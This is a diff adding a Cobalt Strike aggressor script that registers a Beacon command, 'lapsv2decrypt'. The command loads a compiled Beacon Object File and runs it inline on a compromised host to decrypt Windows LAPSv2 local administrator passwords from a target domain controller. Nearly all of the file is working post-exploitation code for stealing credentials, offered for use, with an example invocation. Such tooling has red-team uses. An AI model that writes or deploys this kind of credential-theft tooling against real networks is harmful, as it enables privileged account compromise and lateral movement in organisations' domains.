@@ -1,0 +1,32 @@
+beacon_command_register("lapsv2decrypt", "Decrypts LAPSv2 Credentials", "lapsv2decrypt <TARGET_DC> <BASE_DN> <TARGET_COMPUTER_DN>
+
+Example:
+
+lapsv2decrypt DC01.LAB.LOCAL DC=LAB,DC=LOCAL CN=COMPUTERACC,OU=LAPSENABLED,DC=LAB,DC=LOCAL")
+
+alias lapsv2decrypt {
+    local('$barch $handle $data $args');
+
+    if(size(@_) < 2)
+    {
+        berror($1, beacon_command_detail("lapsv2decrypt"));
+        return;
+    }
+    
+    $barch  = barch($1);
+    
+    $handle = openf(script_resource("bin/bof. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+    
+    $server = $2;
+    $dn = $3;
+    $dnobject = $4;
+    $args = bof_pack($1, "zzz", $server, $dn, $dnobject);
+    
+    btask($1, "Target Server: $server");
+    btask($1, "Target DN: $dn");
+    btask($1, "Computer DN: $dnobject");
+    
+    beacon_inline_execute($1, $data, "go", $args);
+}
